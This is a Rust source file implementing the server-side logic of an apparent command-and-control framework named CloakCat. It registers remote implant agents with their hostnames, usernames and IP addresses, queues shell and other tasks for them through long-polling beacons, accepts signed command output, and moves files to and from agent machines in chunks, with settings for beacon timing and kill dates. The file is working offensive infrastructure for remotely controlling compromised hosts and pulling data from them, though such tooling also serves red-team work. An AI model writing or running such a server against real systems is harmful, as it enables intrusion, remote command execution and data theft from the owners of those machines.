//! Domain logic layer — sits between HTTP handlers and DB.

use base64::engine::general_purpose::STANDARD as B64;
use base64::Engine;
use tokio::time::{Duration, Instant};
use uuid::Uuid;

use cloakcat_protocol::{
    verify_result, AgentView, Command, FileChunk, RegisterReq, ResultReq, ResultView, TaskType,
    UploadTask,
};

use crate::db;
use crate::error::ServerError;
use crate::state::{AppState, DownloadBuffer, UploadBuffer};

fn agent_view_from(a: db::AgentRecord) -> AgentView {
    AgentView {
        agent_id: a.agent_id,
        alias: a.alias,
        platform: a.platform,
        last_seen_at: a.last_seen_at.map(|dt| dt.to_rfc3339()),
        note: a.note,
        profile_name: a.profile_name,
        beacon_min_ms: a.beacon_min_ms.map(|v| v as i64),
        beacon_max_ms: a.beacon_max_ms.map(|v| v as i64),
        backoff_max_ms: a.backoff_max_ms.map(|v| v as i64),
        kill_after_hours: a.kill_after_hours.map(|v| v as i64),
        hostname: a.hostname,
        username: a.username,
        os_version: a.os_version,
        ip_addrs: a.ip_addrs,
        tags: a.tags,
    }
}

// ========== Agent operations ==========

pub async fn get_agent(
    state: &AppState,
    agent_id: &str,
) -> Result<db::AgentRecord, ServerError> {
    db::get_agent_by_id(&state.db, agent_id)
        .await?
        .ok_or(ServerError::NotFound)
}

pub async fn register_agent(
    state: &AppState,
    payload: &RegisterReq,
) -> Result<serde_json::Value, ServerError> {
    // token_b64 is a legacy field kept for DB compatibility
    let token_b64 = B64.encode(Uuid::new_v4().as_bytes());

    db::upsert_agent(
        &state.db,
        &payload.agent_id,
        &payload.platform,
        &token_b64,
        payload.alias.as_deref(),
        payload.note.as_deref(),
        payload.hostname.as_deref(),
        payload.username.as_deref(),
        payload.os_version.as_deref(),
        payload.ip_addrs.as_deref(),
        None,
    )
    .await?;

    println!(
        "Agent registered: id={}, platform={}",
        payload.agent_id, payload.platform
    );

    Ok(serde_json::json!({
        "status": "ok",
        "message": format!("Welcome, agent {}", payload.agent_id),
        "token": token_b64,
    }))
}

pub async fn update_alias(
    state: &AppState,
    agent_id: &str,
    alias: Option<&str>,
    note: Option<&str>,
) -> Result<AgentView, ServerError> {
    let record = db::update_agent_alias(&state.db, agent_id, alias, note).await?;
    Ok(agent_view_from(record))
}

pub async fn list_agents(state: &AppState) -> Result<Vec<AgentView>, ServerError> {
    let records = db::list_agents(&state.db).await?;
    Ok(records.into_iter().map(agent_view_from).collect())
}

pub async fn get_agent_tags(
    state: &AppState,
    agent_id: &str,
) -> Result<Vec<String>, ServerError> {
    let agent = get_agent(state, agent_id).await?;
    Ok(agent.tags)
}

pub async fn set_agent_tags(
    state: &AppState,
    agent_id: &str,
    tags: &[String],
) -> Result<Vec<String>, ServerError> {
    let record = db::update_agent_tags(&state.db, agent_id, tags).await?;
    Ok(record.tags)
}

// ========== Commands ==========

pub async fn push_command(
    state: &AppState,
    agent_id: &str,
    command: &str,
    task_type: TaskType,
) -> Result<(), ServerError> {
    // Encode task_type into the stored command string when not Shell.
    let stored = match &task_type {
        TaskType::Shell => command.to_string(),
        tt => serde_json::to_string(&serde_json::json!({
            "__tt": tt,
            "__cmd": command,
        }))
        .map_err(|e| ServerError::Internal(e.into()))?,
    };

    db::insert_command(&state.db, agent_id, &stored).await?;

    if let Err(e) = db::insert_audit(
        &state.db,
        "catctl",
        "TASK_CREATE",
        "agent",
        agent_id,
        &serde_json::json!({ "command": command, "task_type": task_type }),
    )
    .await
    {
        eprintln!("[audit] failed to insert audit log: {}", e);
    }

    // Wake up any poll_command waiting for this agent
    state.get_notify(agent_id).await.notify_one();

    println!("Command queued for {}: {:?} {:?}", agent_id, task_type, command);
    Ok(())
}

pub async fn poll_command(
    state: &AppState,
    agent_id: &str,
    hold_secs: u64,
) -> Result<Option<Command>, ServerError> {
    let hold = hold_secs.min(120);

    // First check: return immediately if a command is already queued
    if let Some(cmd) = fetch_command(state, agent_id).await? {
        return Ok(Some(cmd));
    }
    if hold == 0 {
        return Ok(None);
    }

    // Long-hold: wait for notification or timeout
    let notify = state.get_notify(agent_id).await;
    let deadline = Instant::now() + Duration::from_secs(hold);

    loop {
        let remaining = deadline.saturating_duration_since(Instant::now());
        if remaining.is_zero() {
            return Ok(None);
        }

        // Wait for push_command to notify us, or timeout
        let _ = tokio::time::timeout(remaining, notify.notified()).await;

        // Check DB regardless (notification or timeout)
        if let Some(cmd) = fetch_command(state, agent_id).await? {
            return Ok(Some(cmd));
        }
    }
}

fn decode_command(cmd_rec: crate::db::CommandRecord) -> Command {
    // Try to decode structured task envelope: {"__tt": ..., "__cmd": ...}
    if let Ok(v) = serde_json::from_str::<serde_json::Value>(&cmd_rec.command) {
        if let (Some(tt_val), Some(cmd_str)) = (v.get("__tt"), v.get("__cmd").and_then(|c| c.as_str())) {
            if let Ok(task_type) = serde_json::from_value::<TaskType>(tt_val.clone()) {
                return Command {
                    cmd_id: cmd_rec.id.to_string(),
                    command: cmd_str.to_string(),
                    task_type,
                };
            }
        }
    }
    Command {
        cmd_id: cmd_rec.id.to_string(),
        command: cmd_rec.command,
        task_type: TaskType::Shell,
    }
}

async fn fetch_command(
    state: &AppState,
    agent_id: &str,
) -> Result<Option<Command>, ServerError> {
    match db::get_oldest_command_for_agent(&state.db, agent_id).await {
        Ok(Some(cmd_rec)) => {
            let cmd = decode_command(cmd_rec);
            println!(
                "[server] poll hit: agent={} -> dispatch cmd {} ({:?})",
                agent_id, cmd.cmd_id, cmd.task_type
            );
            Ok(Some(cmd))
        }
        Ok(None) => Ok(None),
        Err(e) => Err(e.into()),
    }
}

// ========== Results ==========

pub async fn submit_result(
    state: &AppState,
    agent: &db::AgentRecord,
    req: &ResultReq,
) -> Result<(), ServerError> {
    if !verify_result(
        &agent.agent_id,
        &req.cmd_id,
        &req.stdout,
        &req.signature,
        &state.derived_keys.signing_key,
    ) {
        return Err(ServerError::Unauthorized);
    }

    let cmd_uuid = Uuid::parse_str(&req.cmd_id)
        .map_err(|_| ServerError::BadRequest("bad_cmd_id".into()))?;

    db::insert_result(
        &state.db,
        &agent.agent_id,
        cmd_uuid,
        req.exit_code,
        &req.stdout,
        &req.stderr,
    )
    .await?;

    // Refresh last_seen_at via upsert (preserves existing fields)
    db::upsert_agent(
        &state.db,
        &agent.agent_id,
        &agent.platform,
        &agent.token_b64,
        agent.alias.as_deref(),
        agent.note.as_deref(),
        agent.hostname.as_deref(),
        agent.username.as_deref(),
        agent.os_version.as_deref(),
        agent.ip_addrs.as_deref(),
        Some(agent.tags.as_slice()),
    )
    .await?;

    println!(
        "[result] agent={} cmd_id={} exit={}",
        agent.agent_id, req.cmd_id, req.exit_code
    );
    Ok(())
}

pub async fn query_results(
    state: &AppState,
    agent_id: Option<&str>,
    limit: i64,
) -> Result<Vec<ResultView>, ServerError> {
    let records = db::list_results(&state.db, agent_id, limit).await?;
    Ok(records
        .into_iter()
        .map(|r| ResultView {
            agent_id: r.agent_id,
            cmd_id: r.command_id.to_string(),
            exit_code: r.exit_code as i64,
            stdout: r.stdout,
            stderr: r.stderr,
            ts_ms: r.created_at.timestamp_millis(),
        })
        .collect())
}

// ========== File Transfer ==========

/// Store a CLI upload chunk. Returns `true` once all chunks are received and the
/// Upload command has been queued to the agent.
pub async fn receive_upload_chunk(
    state: &AppState,
    agent_id: &str,
    transfer_id: &str,
    path: &str,
    seq: u32,
    total: u32,
    data_b64: &str,
) -> Result<bool, ServerError> {
    if total == 0 || total > 100 {
        return Err(ServerError::BadRequest("total chunks out of range (1-100)".into()));
    }
    let bytes = B64
        .decode(data_b64)
        .map_err(|_| ServerError::BadRequest("invalid base64 data".into()))?;

    let complete = {
        let mut buffers = state.upload_buffers.lock().await;
        let buf = buffers
            .entry(transfer_id.to_string())
            .or_insert_with(|| UploadBuffer {
                chunks: vec![None; total as usize],
            });
        if (seq as usize) < buf.chunks.len() {
            buf.chunks[seq as usize] = Some(bytes);
        }
        buf.chunks.iter().all(|c| c.is_some())
    };

    if complete {
        let task_json = serde_json::to_string(&UploadTask {
            transfer_id: transfer_id.to_string(),
            path: path.to_string(),
        })
        .map_err(|e| ServerError::Internal(e.into()))?;
        push_command(state, agent_id, &task_json, TaskType::Upload).await?;
        println!("[upload] transfer={} complete ({} chunks) -> queued to {}", transfer_id, total, agent_id);
    }

    Ok(complete)
}

/// Return the assembled upload file bytes for an agent fetch.
pub async fn get_upload_bytes(
    state: &AppState,
    transfer_id: &str,
) -> Result<Vec<u8>, ServerError> {
    let buffers = state.upload_buffers.lock().await;
    let buf = buffers.get(transfer_id).ok_or(ServerError::NotFound)?;
    if !buf.chunks.iter().all(|c| c.is_some()) {
        return Err(ServerError::BadRequest("upload transfer not yet complete".into()));
    }
    let assembled: Vec<u8> = buf
        .chunks
        .iter()
        .flat_map(|c| c.as_ref().unwrap().iter().copied())
        .collect();
    Ok(assembled)
}

/// Store an agent download chunk. Returns `true` once all chunks are received.
pub async fn receive_download_chunk(
    state: &AppState,
    chunk: &FileChunk,
) -> Result<bool, ServerError> {
    if chunk.total == 0 || chunk.total > 100 {
        return Err(ServerError::BadRequest("total chunks out of range (1-100)".into()));
    }
    let bytes = B64
        .decode(&chunk.data)
        .map_err(|_| ServerError::BadRequest("invalid base64 data".into()))?;

    let complete = {
        let mut buffers = state.download_buffers.lock().await;
        let buf = buffers
            .entry(chunk.transfer_id.clone())
            .or_insert_with(|| DownloadBuffer {
                chunks: vec![None; chunk.total as usize],
                complete: false,
            });
        if (chunk.seq as usize) < buf.chunks.len() {
            buf.chunks[chunk.seq as usize] = Some(bytes);
        }
        if buf.chunks.iter().all(|c| c.is_some()) {
            buf.complete = true;
        }
        buf.complete
    };

    if complete {
        println!("[download] transfer={} complete ({} chunks)", chunk.transfer_id, chunk.total);
    }
    Ok(complete)
}

/// Return assembled download file bytes if all chunks are received, else `None`.
pub async fn get_download_bytes(
    state: &AppState,
    transfer_id: &str,
) -> Result<Option<Vec<u8>>, ServerError> {
    let buffers = state.download_buffers.lock().await;
    let buf = buffers.get(transfer_id).ok_or(ServerError::NotFound)?;
    if !buf.complete {
        return Ok(None);
    }
    let assembled: Vec<u8> = buf
        .chunks
        .iter()
        .flat_map(|c| c.as_ref().unwrap().iter().copied())
        .collect();
    Ok(Some(assembled))
}

// ========== Audit ==========

pub async fn query_audit(
    state: &AppState,
    limit: i64,
    actor: Option<&str>,
    agent_id: Option<&str>,
) -> Result<Vec<db::AuditRecord>, ServerError> {
    let records = db::list_audit(&state.db, limit, actor, agent_id).await?;
    Ok(records)
}
